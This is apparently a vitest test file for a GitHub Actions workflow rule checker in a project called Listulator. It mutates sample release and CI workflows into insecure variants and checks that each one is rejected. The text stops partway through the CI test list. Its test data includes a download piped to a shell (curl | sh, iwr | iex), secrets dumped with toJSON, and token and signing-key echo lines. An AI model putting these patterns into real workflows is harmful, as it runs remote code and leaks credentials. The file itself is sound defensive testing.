import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { load as loadYaml } from 'js-yaml'
import { describe, expect, it } from 'vitest'
import { type Profile, UPDATER_OVERLAY, type Workflow, workflowProblems } from './ciWorkflowRules.js'

/**
 * The rules every GitHub Actions workflow keeps (`ciWorkflowRules.ts`), run on each real workflow (which must have none) and on hostile
 * ones (each of which must trip exactly the rule it was written for), so a rule that quietly stopped working would fail here. The canary
 * profile is proven in `ciWorkflows.canary.guard.test.ts`.
 */

const WORKFLOWS = join(import.meta.dirname, '../../.github/workflows')

const sha = (letter: string) => letter.repeat(40)

/** A workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD = `
name: Test
on:
  workflow_dispatch:
    inputs:
      profile:
        type: choice
        options: [release, debug]
permissions:
  contents: read
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
      - name: Build
        env:
          PROFILE: \${{ inputs.profile || 'release' }}
        run: npm ci --ignore-scripts
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Rust
        shell: pwsh
        run: |
          $channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line
          rustup toolchain install $channel --profile minimal --no-self-update
      - name: Installer
        shell: pwsh
        run: |
          if ($true) {
            npm run tauri:build -w @listulator/desktop -- --bundles nsis --debug -- --locked
          } else {
            npm run tauri:build -w @listulator/desktop -- --bundles nsis -- --locked
          }
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: x
          path: y
          retention-days: 3
`

const parse = (text: string) => loadYaml(text) as Workflow

describe('the rules for a workflow, proven on hostile workflows', () => {
  it('accept a workflow that breaks none', () => {
    expect(workflowProblems(parse(GOOD))).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a pull request trigger', (t) => t.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'), /not by hand only/],
    ['a push trigger instead', (t) => t.replace('  workflow_dispatch:\n    inputs:\n      profile:\n        type: choice\n        options: [release, debug]', '  push:'), /not by hand only/],
    ['write permission', (t) => t.replace('contents: read', 'contents: write'), /permissions: \{ contents: read \}/],
    ['no permissions at all', (t) => t.replace('permissions:\n  contents: read\n', ''), /permissions: \{ contents: read \}/],
    ['a job that widens its permissions', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    permissions:\n      contents: write'), /widens its permissions/],
    ['an action named by tag', (t) => t.replace(`actions/checkout@${sha('a')} # v1`, 'actions/checkout@v4'), /not a GitHub-owned action pinned/],
    ['an action from another owner, pinned', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, `someone/else@${sha('b')}`), /not a GitHub-owned action pinned/],
    ['a local action', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, './.github/actions/mine'), /not a GitHub-owned action pinned/],
    ['a docker action', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, 'docker://alpine:3'), /not a GitHub-owned action pinned/],
    ['a self-hosted runner', (t) => t.replace('windows-latest', 'self-hosted'), /not a GitHub-hosted runner/],
    ['a runner list with self-hosted', (t) => t.replace('windows-latest', '[self-hosted, linux]'), /not a GitHub-hosted runner/],
    ['a runner chosen by an expression', (t) => t.replace('windows-latest', '${{ inputs.runner }}'), /not a GitHub-hosted runner/],
    ['a checkout that keeps credentials', (t) => t.replace('          persist-credentials: false', '          fetch-depth: 0'), /persist-credentials: false/],
    ['a checkout that sets it true', (t) => t.replace('persist-credentials: false', 'persist-credentials: true'), /persist-credentials: false/],
    ['an artifact kept a month', (t) => t.replace('retention-days: 3', 'retention-days: 30'), /retention-days/],
    ['an artifact with no retention set', (t) => t.replace('          retention-days: 3\n', ''), /retention-days/],
    ['an input pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ inputs.profile }}"), /contains \$\{\{/],
    ['a branch name pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ github.head_ref }}"), /contains \$\{\{/],
    ['an output pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ steps.x.outputs.y }}"), /contains \$\{\{/],
    ['a download piped to a shell', (t) => t.replace('run: npm ci --ignore-scripts', 'run: curl -fsSL https://example.com/i.sh | sh'), /downloads or evaluates/],
    ['a PowerShell download evaluated', (t) => t.replace('run: npm ci --ignore-scripts', "run: iwr https://example.com/i.ps1 | iex"), /downloads or evaluates/],
    ['npx of a package named on the fly', (t) => t.replace('run: npm ci --ignore-scripts', 'run: npx some-package'), /uses npx/],
    ['a secret in the usual spelling', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'TOKEN: ${{ secrets.TOKEN }}'), /secret or the token/],
    ['a secret by index', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", "TOKEN: ${{ secrets['TOKEN'] }}"), /secret or the token/],
    ['all secrets as JSON', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'ALL: ${{ toJSON(secrets) }}'), /secret or the token/],
    ['the workflow token handed to a step', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'T: ${{ github.token }}'), /secret or the token/],
    ['the token under its usual name', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'GITHUB_TOKEN: ${{ github.token }}'), /secret or the token/],
    ['GITHUB_TOKEN read in a script', (t) => t.replace('run: npm ci --ignore-scripts', 'run: echo $env:GITHUB_TOKEN'), /secret or the token/],
    ['secrets: inherit on a job', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    secrets: inherit'), /passes secrets/],
    ['a job that may fail quietly', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    continue-on-error: true'), /continue-on-error/],
    ['a step that may fail quietly', (t) => t.replace('        run: npm ci --ignore-scripts', '        continue-on-error: true\n        run: npm ci --ignore-scripts'), /continue-on-error/],
    ['an environment', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    environment: release'), /uses an environment/],
    ['a node version named in the workflow', (t) => t.replace('node-version-file: .node-version', 'node-version: 26'), /names a node-version/],
    ['a node version range', (t) => t.replace('node-version-file: .node-version', 'node-version: ">=20"\n          node-version-file: .node-version'), /names a node-version/],
    ['a node version file that is not .node-version', (t) => t.replace('node-version-file: .node-version', 'node-version-file: package.json'), /does not read .node-version/],
    ['rustup given stable', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup toolchain install stable --profile minimal rust-toolchain.toml'), /moving channel/],
    ['rustup default stable', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup default stable # rust-toolchain.toml'), /moving channel/],
    ['rustup given a nightly', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup toolchain install nightly # rust-toolchain.toml'), /moving channel/],
    ['rustup with a version written in the workflow, not read from the file', (t) => t.replace("$channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line\n          rustup toolchain install $channel", 'rustup toolchain install 1.98.1'), /does not take its version from rust-toolchain.toml/],
    ['a tauri build without --locked (the release branch)', (t) => t.replace('--bundles nsis -- --locked', '--bundles nsis'), /not run with --locked/],
    ['a tauri build without --locked (the debug branch)', (t) => t.replace('--debug -- --locked', '--debug'), /not run with --locked/],
    ['a cargo build without --locked', (t) => t.replace('run: npm ci --ignore-scripts', 'run: cargo build --release'), /not run with --locked/],
    ['the updater key variable in a manual workflow', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'TAURI_SIGNING_PRIVATE_KEY: x'), /names the updater key/],
    ['the updater-artifacts overlay in a manual workflow', (t) => t.replace('--bundles nsis --debug -- --locked', '--bundles nsis --debug --config src-tauri/tauri.updater-artifacts.conf.json -- --locked'), /names the updater key or the updater-artifacts overlay/],
    ['a repository variable in a manual workflow', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'V: ${{ vars.SOMETHING }}'), /reads a repository variable/],
    ['a cargo test without --locked', (t) => t.replace('run: npm ci --ignore-scripts', 'run: cargo test'), /not run with --locked/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD)

    expect(changed).not.toBe(GOOD)
    expect(workflowProblems(parse(changed)).join(' | ')).toMatch(expected)
  })
})


/** A release workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD_RELEASE = `
name: Release
on:
  push:
    tags: ['v*']
permissions:
  contents: read
jobs:
  build:
    runs-on: windows-2025
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: The tag is a release of main
        shell: pwsh
        env:
          TAG: \${{ github.ref_name }}
        run: |
          git merge-base --is-ancestor $env:GITHUB_SHA origin/main
          $version = (Get-Content package.json | ConvertFrom-Json).version
          if ("v$version" -ne $env:TAG) { throw 'tag and version differ' }
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Rust
        shell: pwsh
        run: |
          $channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line
          rustup toolchain install $channel --profile minimal --no-self-update
      - name: Throw-away key
        shell: pwsh
        run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$env:RUNNER_TEMP/updater-throwaway.key"
      - name: Installer
        shell: pwsh
        env:
          TAURI_SIGNING_PRIVATE_KEY: \${{ runner.temp }}/updater-throwaway.key
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''
        run: npm run tauri:build -w @listulator/desktop -- --bundles nsis --config src-tauri/tauri.updater-artifacts.conf.json -- --locked
      - name: The installer carries the tag
        shell: pwsh
        env:
          TAG: \${{ github.ref_name }}
        run: |
          $expected = "Listulator_$($env:TAG.Substring(1))_x64-setup.exe"
          if (@($installers).Count -ne 1 -or $installers[0].Name -ne $expected) { throw 'wrong installer' }
      - name: The installer installs and starts
        run: npm run release:install-check
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: installer
          path: x
          retention-days: 3
  build-macos:
    runs-on: macos-15
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: The tag is a release of main
        env:
          TAG: \${{ github.ref_name }}
        run: |
          git merge-base --is-ancestor "$GITHUB_SHA" origin/main
          test "v$(node -p "require('./package.json').version")" = "$TAG"
      - name: Throw-away key
        run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"
      - name: Installer
        env:
          TAURI_SIGNING_PRIVATE_KEY: \${{ runner.temp }}/updater-throwaway.key
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''
        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg --config src-tauri/tauri.updater-artifacts.conf.json -- --locked
      - name: Audit
        run: |
          tar -xzf Listulator.app.tar.gz -C unpacked
          codesign --verify --deep --strict unpacked/Listulator.app
          [ "$(plutil -extract CFBundleIdentifier raw -o - unpacked/Listulator.app/Contents/Info.plist)" = com.listulator.desktop ] || exit 1
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: dmg
          path: y
          retention-days: 3
  attest:
    needs: [build, build-macos]
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write
      attestations: write
    steps:
      - uses: actions/download-artifact@${sha('d')} # v1
        with:
          path: dist
      - uses: actions/attest-build-provenance@${sha('e')} # v1
        with:
          subject-path: |
            dist/*.exe
            dist/*.dmg
            dist/*.tar.gz
  publish:
    needs: [build, build-macos, attest]
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@${sha('d')} # v1
        with:
          name: installer
      - name: Draft the Release
        env:
          GH_TOKEN: \${{ github.token }}
          TAG: \${{ github.ref_name }}
        run: |
          if compgen -G '*.sig' > /dev/null; then exit 1; fi
          for file in *.exe *.dmg *.tar.gz; do gh attestation verify "$file" --repo x; done
          sha256sum -- *.exe *.dmg *.tar.gz > SHA256SUMS
          gh release create "$TAG" --draft --verify-tag --title "Listulator $TAG" --notes "Draft" -- *.exe *.dmg *.tar.gz SHA256SUMS
`

describe('the rules for the release workflow, proven on hostile workflows', () => {
  const release = (text: string) => workflowProblems(parse(text), 'release')

  it('accept a release workflow that breaks none', () => {
    expect(release(GOOD_RELEASE)).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a branch trigger as well', (t) => t.replace("    tags: ['v*']", "    tags: ['v*']\n    branches: [main]"), /not only by a pushed v\* tag/],
    ['a push to any branch instead of a tag', (t) => t.replace("    tags: ['v*']", '    branches: [main]'), /not only by a pushed v\* tag/],
    ['a pull request trigger as well', (t) => t.replace('  push:', '  pull_request:\n  push:'), /not only by a pushed v\* tag/],
    ['a button with a debug input', (t) => t.replace('  push:', '  workflow_dispatch:\n    inputs:\n      debug:\n        type: boolean\n  push:'), /not only by a pushed v\* tag/],
    ['any tag, not only v*', (t) => t.replace("tags: ['v*']", "tags: ['*']"), /not only by a pushed v\* tag/],
    ['write permission for the whole workflow', (t) => t.replace('permissions:\n  contents: read\njobs:', 'permissions:\n  contents: write\njobs:'), /permissions: \{ contents: read \}/],
    ['write permission in the build job', (t) => t.replace('    runs-on: windows-2025\n    permissions:\n      contents: read', '    runs-on: windows-2025\n    permissions:\n      contents: write'), /job build widens/],
    ['an id-token in the build job', (t) => t.replace('    runs-on: windows-2025\n    permissions:\n      contents: read', '    runs-on: windows-2025\n    permissions:\n      contents: read\n      id-token: write'), /job build widens/],
    ['more than contents in the publish job', (t) => t.replace('      contents: write', '      contents: write\n      attestations: write'), /job publish widens/],
    ['a moving runner image', (t) => t.replace('windows-2025', 'windows-latest'), /names its image/],
    ['the token in the build job', (t) => t.replace('          TAG: ${{ github.ref_name }}\n        run: |\n          git merge', '          TAG: ${{ github.ref_name }}\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          git merge'), /secret or the token/],
    ['the token under another name in publish', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'OTHER: ${{ github.token }}'), /secret or the token/],
    ['a secret in publish', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'GH_TOKEN: ${{ secrets.PAT }}'), /secret or the token/],
    ['an environment', (t) => t.replace('  publish:\n    needs: [build, build-macos, attest]', '  publish:\n    needs: [build, build-macos, attest]\n    environment: release'), /uses an environment/],
    ['an action named by tag', (t) => t.replace(`actions/download-artifact@${sha('d')} # v1`, 'actions/download-artifact@v8'), /not a GitHub-owned action pinned/],
    ['an action from another owner', (t) => t.replace(`actions/download-artifact@${sha('d')}`, `softprops/action-gh-release@${sha('d')}`), /not a GitHub-owned action pinned/],
    ['a Release that is not a draft', (t) => t.replace('--draft ', ''), /without --draft/],
    ['a Release published after it is drafted', (t) => t.replace('--draft ', '--draft=false '), /un-drafts/],
    ['a Release edited afterwards', (t) => t.replace('sha256sum -- *.exe', 'gh release edit "$TAG" --latest\n          sha256sum -- *.exe'), /edits or deletes/],
    ['gh release in the build job', (t) => t.replace('          git merge-base', '          gh release list\n          git merge-base'), /uses gh release/],
    ['no check that the commit is on main', (t) => t.replace('git merge-base --is-ancestor $env:GITHUB_SHA origin/main', 'git log -1'), /on main/],
    ['no check that the tag is the version', (t) => t.replace('package.json', 'something.json'), /matches the version/],
    ['the macOS job without the ancestry check', (t) => t.replace('git merge-base --is-ancestor "$GITHUB_SHA" origin/main', 'git log -1'), /job build-macos never checks.*on main/],
    ['the macOS job without the version check', (t) => t.replace("test \"v$(node -p \"require('./package.json').version\")\" = \"$TAG\"", 'true'), /job build-macos never checks.*version in package.json/],
    ['a moving macOS image', (t) => t.replace('macos-15', 'macos-latest'), /names its image/],
    ['a macOS build that may write', (t) => t.replace('  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: read', '  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: write'), /job build-macos widens/],
    ['an attest job with write access to the repository', (t) => t.replace('  attest:\n    needs: [build, build-macos]\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read', '  attest:\n    needs: [build, build-macos]\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: write'), /job attest widens/],
    ['the signing token in the publish job', (t) => t.replace(`      contents: write\n    steps:\n      - uses: actions/download-artifact@${sha('d')} # v1\n        with:\n          name: installer`, `      contents: write\n      id-token: write\n    steps:\n      - uses: actions/download-artifact@${sha('d')} # v1\n        with:\n          name: installer`), /job publish widens/],
    ['the signing token in a build job', (t) => t.replace('  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: read', '  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: read\n      id-token: write\n      attestations: write'), /job build-macos widens/],
    ['an attest job that also writes an extra permission', (t) => t.replace('      attestations: write\n    steps:', '      attestations: write\n      packages: write\n    steps:'), /job attest widens/],
    ['an attest job that runs a script', (t) => t.replace(`      - uses: actions/attest-build-provenance@${sha('e')} # v1`, `      - run: echo hello\n      - uses: actions/attest-build-provenance@${sha('e')} # v1`), /attest runs a script/],
    ['an attest job that attests only the Windows installer', (t) => t.replace('            dist/*.exe\n            dist/*.dmg\n            dist/*.tar.gz', '            dist/*.exe'), /attest every installer/],
    ['an attest job that leaves the update archive out', (t) => t.replace('\n            dist/*.tar.gz', ''), /does not attest the update archive/],
    ['an attest job with no attestation step', (t) => t.replace(`actions/attest-build-provenance@${sha('e')} # v1`, `actions/upload-artifact@${sha('e')} # v1`), /does not use actions\/attest-build-provenance/],
    ['the attestation action named by tag', (t) => t.replace(`actions/attest-build-provenance@${sha('e')} # v1`, 'actions/attest-build-provenance@v4'), /not a GitHub-owned action pinned/],
    ['the attestation action from another owner', (t) => t.replace(`actions/attest-build-provenance@${sha('e')}`, `someone/attest@${sha('e')}`), /not a GitHub-owned action pinned/],
    ['no attest job', (t) => t.replace('  attest:', '  other:'), /no job named attest/],
    ['no publish job', (t) => t.replace('  publish:', '  other:'), /no job named publish/],
    ['a publish job that does not wait', (t) => t.replace('    needs: [build, build-macos, attest]\n', ''), /does not wait/],
    ['the tag pasted into a script', (t) => t.replace('gh release create "$TAG"', 'gh release create ${{ github.ref_name }}'), /contains \$\{\{/],
    // The updater key (20.12a, SR-063): a build job's own throw-away key, for its build step only, and nothing else anywhere.
    ['the updater key read from a secret', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key', 'TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.UPDATER_KEY }}'), /secret or the token/],
    ['the updater key read from a variable', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key', 'TAURI_SIGNING_PRIVATE_KEY: ${{ vars.UPDATER_KEY }}'), /reads a repository variable/],
    ['the updater key as text in the workflow', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key', 'TAURI_SIGNING_PRIVATE_KEY: dW50cnVzdGVk'), /not the job's own throw-away key file/],
    ['the updater key from another file', (t) => t.replace('${{ runner.temp }}/updater-throwaway.key', '${{ runner.temp }}/real.key'), /not the job's own throw-away key file/],
    ['a password for the throw-away key', (t) => t.replace("TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''", "TAURI_SIGNING_PRIVATE_KEY_PASSWORD: hunter2"), /is not empty/],
    ['the key path variable', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY_PASSWORD: \'\'', 'TAURI_SIGNING_PRIVATE_KEY_PATH: x'), /only the key file and an empty password/],
    ['the updater key in the publish job', (t) => t.replace('          GH_TOKEN: ${{ github.token }}\n', '          GH_TOKEN: ${{ github.token }}\n          TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key\n'), /only a build job has a key/],
    ['the updater key for a whole job', (t) => t.replace('  build-macos:\n    runs-on: macos-15\n', '  build-macos:\n    runs-on: macos-15\n    env:\n      TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key\n'), /outside a step's env/],
    ['the updater key for the whole workflow', (t) => t.replace('permissions:\n  contents: read\njobs:', 'permissions:\n  contents: read\nenv:\n  TAURI_SIGNING_PRIVATE_KEY: x\njobs:'), /at the workflow level/],
    ['the updater key printed by a script', (t) => t.replace('run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"', 'run: echo $TAURI_SIGNING_PRIVATE_KEY'), /a run: script names the updater key/],
    ['a build job with no throw-away key of its own', (t) => t.replace('signer generate --ci -w "$env:RUNNER_TEMP/updater-throwaway.key"', 'signer generate --ci -w "$env:RUNNER_TEMP/other.key"'), /job build does not make its own throw-away key/],
    ['a macOS build job with no throw-away key of its own', (t) => t.replace('signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"', 'signer generate --ci'), /job build-macos does not make its own throw-away key/],
    ['a build step with no key', (t) => t.replace("          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''\n        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg", "        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg").replace('          TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key\n        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg', '        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg'), /job build-macos: the build step does not get the throw-away key/],
    ['a build that does not switch the update files on', (t) => t.replace(' --config src-tauri/tauri.updater-artifacts.conf.json -- --locked', ' -- --locked'), /does not pass --config/],
    ['the overlay on another line than the build', (t) => t.replace('--bundles nsis --config src-tauri/tauri.updater-artifacts.conf.json -- --locked', '--bundles nsis -- --locked # --config src-tauri/tauri.updater-artifacts.conf.json').replace('# --config src-tauri/tauri.updater-artifacts.conf.json', '#'), /job build: the build does not pass --config/],
    ['a Windows job that does not check the installer carries the tag’s version', (t) => t.replace('_x64-setup.exe', '_x64.exe'), /does not check that the installer's name/],
    ['a macOS job that does not check the app identifier', (t) => t.replace('= com.listulator.desktop ]', '= com.listulator.desktop.dev ]'), /does not check that the app identifier is com\.listulator\.desktop/],
    ['a signature file uploaded', (t) => t.replace('          name: installer\n          path: x', '          name: installer\n          path: x/*.exe.sig'), /takes a \.sig file/],
    ['a publish job that never mentions the update archive', (t) => t.replace('for file in *.exe *.dmg *.tar.gz; do', 'for file in *.exe *.dmg; do').replace('sha256sum -- *.exe *.dmg *.tar.gz > SHA256SUMS', 'sha256sum -- *.exe *.dmg > SHA256SUMS').replace('-- *.exe *.dmg *.tar.gz SHA256SUMS', '-- *.exe *.dmg SHA256SUMS'), /does not handle the update archive/],
    ['a macOS job that does not unpack the update archive', (t) => t.replace('tar -xzf Listulator.app.tar.gz -C unpacked', 'true'), /does not unpack and audit the update archive/],
    ['a publish job that does not verify the archive’s attestation', (t) => t.replace('for file in *.exe *.dmg *.tar.gz; do', 'for file in *.exe *.dmg; do'), /does not verify the attestation of every file/],
    ['a publish job that does not refuse a signature file', (t) => t.replace("          if compgen -G '*.sig' > /dev/null; then exit 1; fi\n", ''), /does not refuse a signature file/],
    ['an artifact kept a month', (t) => t.replace('retention-days: 3', 'retention-days: 30'), /retention-days/],
    ['a build without --locked', (t) => t.replace('tauri.updater-artifacts.conf.json -- --locked', 'tauri.updater-artifacts.conf.json'), /not run with --locked/],
    // BL-120: the installer the build made is installed and started before it is uploaded, and nothing touches it in between.
    ['no install check of the installer in the Windows job', (t) => t.replace('      - name: The installer installs and starts\n        run: npm run release:install-check\n', ''), /never installs the installer it built/],
    ['an install check that is skipped on the end of its line', (t) => t.replace('run: npm run release:install-check', 'run: npm run release:install-check || true'), /never installs the installer it built/],
    ['an install check with arguments', (t) => t.replace('run: npm run release:install-check', 'run: npm run release:install-check -- --skip'), /never installs the installer it built/],
    ['a step between the install check and the upload', (t) => t.replace('      - name: The installer installs and starts\n        run: npm run release:install-check\n', '      - name: The installer installs and starts\n        run: npm run release:install-check\n      - name: Touch the installer\n        run: echo changed\n'), /not the step right before the upload/],
    ['an install check before the installer is built', (t) => t.replace('      - name: The installer installs and starts\n        run: npm run release:install-check\n', '').replace('      - name: Installer\n        shell: pwsh', '      - name: The installer installs and starts\n        run: npm run release:install-check\n      - name: Installer\n        shell: pwsh'), /before the installer is built/],
    ['an install check that runs only sometimes', (t) => t.replace('run: npm run release:install-check', 'if: false\n        run: npm run release:install-check'), /says more than a name and a run/],
    ['an install check in another folder', (t) => t.replace('run: npm run release:install-check', 'working-directory: apps\n        run: npm run release:install-check'), /says more than a name and a run/],
    ['an install check with an environment', (t) => t.replace('run: npm run release:install-check', 'env:\n          NODE_OPTIONS: --require x.js\n        run: npm run release:install-check'), /says more than a name and a run/],
    ['an install check in the macOS job', (t) => t.replace('      - name: Throw-away key\n        run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"\n      - name: Installer\n        env:', '      - name: Throw-away key\n        run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"\n      - run: npm run release:install-check\n      - name: Installer\n        env:'), /outside the Windows build job/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD_RELEASE)

    expect(changed).not.toBe(GOOD_RELEASE)
    expect(release(changed).join(' | ')).toMatch(expected)
  })

  it('does not let the manual workflow have the release privileges: its publish job may not write, nor may it use the token', () => {
    expect(workflowProblems(parse(GOOD_RELEASE), 'manual').length).toBeGreaterThan(0)
  })
})

/** A CI workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD_CI = `
name: CI
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  checks:
    runs-on: ubuntu-24.04
    timeout-minutes: 60
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Install
        run: npm ci --ignore-scripts
      - name: Rust
        run: |
          cargo test --locked
`

describe('the rules for a CI workflow, proven on hostile workflows', () => {
  it('accept a CI workflow that breaks none', () => {
    expect(workflowProblems(parse(GOOD_CI), 'ci')).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a pull request trigger (a stranger\'s change would run here)', (t) => t.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'), /not only by a push to main/],
    ['pull_request_target (runs a stranger\'s change with this repository\'s rights)', (t) => t.replace('  workflow_dispatch:', '  pull_request_target:\n  workflow_dispatch:'), /not only by a push to main/],
    ['a schedule', (t) => t.replace('  workflow_dispatch:', '  schedule:\n    - cron: "0 3 * * *"\n  workflow_dispatch:'), /not only by a push to main/],
    ['workflow_run (chained to another workflow)', (t) => t.replace('  workflow_dispatch:', '  workflow_run:\n    workflows: [x]\n  workflow_dispatch:'), /not only by a push to main/],
    ['a push to every branch', (t) => t.replace('    branches: [main]', '    branches: ["**"]'), /not only by a push to main/],
    ['a push to another branch', (t) => t.replace('    branches: [main]', '    branches: [main, spike]'), /not only by a push to main/],
    ['a push of tags', (t) => t.replace('    branches: [main]', '    branches: [main]\n    tags: ["v*"]'), /not only by a push to main/],
    ['a push with no branch filter', (t) => t.replace('  push:\n    branches: [main]', '  push:'), /not only by a push to main/],
    ['no button', (t) => t.replace('  workflow_dispatch:\n', ''), /not only by a push to main/],
    ['a button with an input', (t) => t.replace('  workflow_dispatch:', '  workflow_dispatch:\n    inputs:\n      x:\n        type: string'), /not only by a push to main/],
    ['write permission', (t) => t.replace('contents: read\njobs', 'contents: write\njobs'), /permissions: \{ contents: read \}/],
    ['a job that widens its permissions', (t) => t.replace('    permissions:\n      contents: read', '    permissions:\n      contents: write'), /widens its permissions/],
    ['an action named by tag', (t) => t.replace(`actions/checkout@${sha('a')} # v1`, 'actions/checkout@v4'), /not a GitHub-owned action pinned/],
    ['a self-hosted runner', (t) => t.replace('ubuntu-24.04', 'self-hosted'), /not a GitHub-hosted runner/],
    ['a moving runner image', (t) => t.replace('ubuntu-24.04', 'ubuntu-latest'), /names its image/],
    ['a secret', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          T: ${{ secrets.T }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
    ['the workflow token', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          T: ${{ github.token }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
    ['a repository variable', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          V: ${{ vars.X }}\n        run: npm ci --ignore-scripts'), /reads a repository variable/],
    ['the updater key', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          TAURI_SIGNING_PRIVATE_KEY: x\n        run: npm ci --ignore-scripts'), /names the updater key/],
    ['an artifact upload (logs and artifacts of a public repository are public)', (t) => t.replace('      - name: Rust', `      - uses: actions/upload-artifact@${sha('b')} # v1\n        with:\n          name: x\n          path: y\n          retention-days: 1\n      - name: Rust`), /uploads an artifact/],
    ['a job with no time limit', (t) => t.replace('    timeout-minutes: 60\n', ''), /timeout-minutes/],
    ['a job with an hours-long time limit', (t) => t.replace('timeout-minutes: 60', 'timeout-minutes: 360'), /timeout-minutes/],
    ['npx', (t) => t.replace('run: npm ci --ignore-scripts', 'run: npx some-package'), /uses npx/],
    ['a download piped to a shell', (t) => t.replace('run: npm ci --ignore-scripts', 'run: curl -fsSL https://example.com/i.sh | sh'), /downloads or evaluates/],
    ['a value pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', 'run: echo ${{ github.head_ref }}'), /contains \$\{\{/],
    ['a step that may fail quietly', (t) => t.replace('        run: npm ci --ignore-scripts', '        continue-on-error: true\n        run: npm ci --ignore-scripts'), /continue-on-error/],
    ['a cargo test without --locked', (t) => t.replace('cargo test --locked', 'cargo test'), /not run with --locked/],
